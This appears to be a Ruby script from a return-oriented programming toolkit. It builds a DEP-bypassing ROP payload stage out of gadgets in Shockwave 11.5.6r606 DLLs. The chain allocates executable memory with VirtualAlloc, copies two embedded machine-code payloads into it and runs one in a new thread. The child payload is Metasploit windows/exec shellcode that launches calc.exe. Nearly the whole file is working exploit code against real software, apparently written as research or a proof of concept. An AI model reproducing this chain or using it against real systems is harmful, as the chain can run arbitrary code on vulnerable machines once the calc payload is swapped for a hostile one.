#!/usr/bin/env ruby
#
# This return-oriented payload stage copies two embedded
# traditional machine code payloads into executable memory, creates a
# new thread to execute the "child" payload, and then executes the
# "parent" payload in the current thread.
#
# It was written using borrowable instructions from SwDir.dll,
# dirapi.dll, and iml32.dll from Shockwave 11.5.6r606.
#

lib = File.expand_path('../../lib', __FILE__)
$LOAD_PATH.unshift(lib) unless $LOAD_PATH.include?(lib)

require 'bisc'

bisc = BISC::Assembler.new(ARGV)

#
# Allocate storage for any variables used
#
pESP = bisc.allocate(4)

#
# Get and store pointer to the beginning of 'program' at pESP
#
GetESP = [
  "POP EAX", pESP,
  "POP EDX", "MOV [EBX], EAX",
  "MOV [EAX], EDX",
  "POP ECX", 4,
  "ADD EAX, ECX",
  "POP EDX", "XCHG EAX, ESP",
  "MOV [EAX], EDX",

  "POP EAX", pESP,
  "POP EBX", pESP,
  "XCHG EAX, ESP"
]


lppVirtualAlloc = bisc.get_iat_pointer("KERNEL32.DLL", "VirtualAlloc")
lppmemcpy = bisc.get_iat_pointer("MSVCR71.DLL", "memcpy")
ppfnCreateThread = bisc.get_iat_pointer("KERNEL32.DLL", "CreateThread")
lpMem = bisc.allocate(4)
lpThreadId = bisc.allocate(4)

#
# "Parent" payload
#
parent = "\xeb\xfe"

#
# "Child" payload
#
# MSF CMD=calc.exe windows/exec
#
child =
  "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
  "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
  "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
  "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" +
  "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
  "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" +
  "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" +
  "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
  "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" +
  "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" +
  "\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68" +
  "\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95" +
  "\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" +
  "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e" +
  "\x65\x78\x65\x00"

payloads_length = parent.length + child.length

Main = [
  "POP ECX", lppVirtualAlloc,
  "MOV EAX, [ECX]",
  "PUSH EAX", "NOP", 0, 65535, 0x1000, 0x40,
  "POP EBX", lpMem,
  "MOV [EBX], EAX",

  # Point EDI to value on stack to overwrite
  "POP ECX", pESP,
  "MOV EAX, [ECX]",
  "POP ECX", 42*4,  # This is the offset from Main to target value (0xdeadbeef)
  "ADD EAX, ECX",
  "XCHG EAX, EDI",

  # Write allocated address as 1st arg to memcpy
  "POP ECX", lpMem,
  "MOV EAX, [ECX]",
  "MOV [EDI], EAX",

  # Point EDI to value on stack to overwrite
  "POP ECX", pESP,
  "MOV EAX, [ECX]",
  "POP ECX", 43*4,  # This is the offset from Main to target value (0xdeadbeef)
  "ADD EAX, ECX",
  "XCHG EAX, EDI",

  # Write traditional payload address as 2nd arg to memcpy
  "POP ECX", pESP,
  "MOV EAX, [ECX]",
  "POP ECX", 75*4,  # Pointer to machine-code payloads that follow
  "ADD EAX, ECX",
  "MOV [EDI], EAX",

  "POP ECX", lppmemcpy,
  "MOV EAX, [ECX]",
  "PUSH EAX", "ADD ESP, 12", 0xdeadbeef, 0xdeadbeef, payloads_length,

  # Point EDI to value on stack to overwrite
  "POP ECX", pESP,
  "MOV EAX, [ECX]",
  "POP ECX", 66*4,  # This is the offset from Main to target value (0xdeadbeef)
  "ADD EAX, ECX",
  "XCHG EAX, EDI",

  "POP ECX", lpMem,
  "MOV EAX, [ECX]",
  "POP ECX", parent.length,
  "ADD EAX, ECX",
  "MOV [EDI], EAX",

  # Create new thread to execute child payload
  "POP ECX", ppfnCreateThread,
  "MOV EAX, [ECX]",
  "PUSH EAX", "NOP", 0, 0, 0xdeadbeef, 0, 0, lpThreadId,

  # Call parent payload
  "POP ECX", lpMem,
  "MOV EAX, [ECX]",
  "PUSH EAX"
]

print bisc.assemble(GetESP + Main) + parent + child
